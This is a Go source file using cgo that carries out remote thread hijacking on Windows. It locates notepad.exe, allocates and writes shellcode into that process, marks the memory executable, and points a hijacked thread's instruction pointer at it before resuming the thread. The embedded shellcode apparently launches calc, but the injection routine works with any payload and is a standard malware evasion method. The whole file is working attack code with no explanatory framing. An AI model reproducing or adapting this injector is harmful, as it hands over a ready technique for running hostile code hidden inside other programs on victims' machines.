package main

/*
#cgo LDFLAGS: -luser32 -lkernel32
#include "remote_thread_hijacking.c"
#include <stdint.h>
#include <windows.h>
*/
import "C"
import (
    "fmt"
    "log"
    "unsafe"
)

const (
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT              = 0x00001000
    MEM_RESERVE             = 0x00002000
    THREAD_ALL_ACCESS       = 0x001F03FF
    INFINITE                = 0xFFFFFFFF
    CONTEXT_FULL            = 0x00010000
)


var shellcode = []byte{
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
    0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
    0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
    0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
    0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
    0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
    0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}


func main() {
    name := "notepad.exe"
    cName := C.CString(name)
    defer C.free(unsafe.Pointer(cName))

    processHandle := C.find_process(cName)
    if processHandle == nil {
        log.Fatalf("Error finding process handle")
    }
    defer C.CloseHandle(processHandle)

    pid := C.GetProcessId(processHandle)

    threadHandle := C.find_thread(pid)
    if threadHandle == nil {
        log.Fatalf("Error finding thread handle")
    }
    defer C.CloseHandle(threadHandle)

    size := len(shellcode)
    address := C.virtual_alloc_ex(processHandle, C.SIZE_T(size))
    if address == nil {
        log.Fatalf("VirtualAllocEx failed")
    }

    if success := C.write_process_memory(processHandle, address, unsafe.Pointer(&shellcode[0]), C.SIZE_T(size)); success == 0 {
        log.Fatalf("WriteProcessMemory failed")
    }

    var oldProtect C.DWORD
    if success := C.virtual_protect_ex(processHandle, address, C.SIZE_T(size), C.DWORD(PAGE_EXECUTE_READWRITE), &oldProtect); success == 0 {
        log.Fatalf("VirtualProtectEx failed")
    }

    var ctx C.CONTEXT
    ctx.ContextFlags = C.DWORD(C.CONTEXT_FULL)
    if success := C.get_thread_context(threadHandle, &ctx); success == 0 {
        log.Fatalf("GetThreadContext failed")
    }

    // Convert addr to uintptr then to C.ULONG_PTR
    ctx.Rip = C.ULONG_PTR(uintptr(address))

    if success := C.set_thread_context(threadHandle, &ctx); success == 0 {
        log.Fatalf("SetThreadContext failed")
    }

    if success := C.resume_thread(threadHandle); success == C.DWORD(0xFFFFFFFF) {
        log.Fatalf("ResumeThread failed")
    }

    C.wait_for_single_object(threadHandle, C.INFINITE)

    fmt.Println("Thread executed!")
}